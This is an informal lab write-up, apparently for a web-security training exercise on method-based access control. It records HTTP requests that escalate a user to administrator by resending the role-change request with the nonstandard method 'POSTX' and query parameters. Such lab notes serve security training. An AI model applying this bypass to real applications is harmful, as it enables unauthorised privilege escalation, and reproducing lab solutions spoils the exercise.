Lab: Method-based access control can be circumvented

 This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 


GET /admin HTTP/2

POST /admin-roles HTTP/2

username=carlos&action=downgrade

username=carlos&action=upgrade

X-Original-URL: /admin dont work

lets try copying the POST /admin-roles HTTP/2

No authoriced so we try with POSTX
POSTX admin-roles HTTP/2

now is asking for user and actio so 

POSTX /admin-roles?username=wiener&action=upgrade HTTP/2
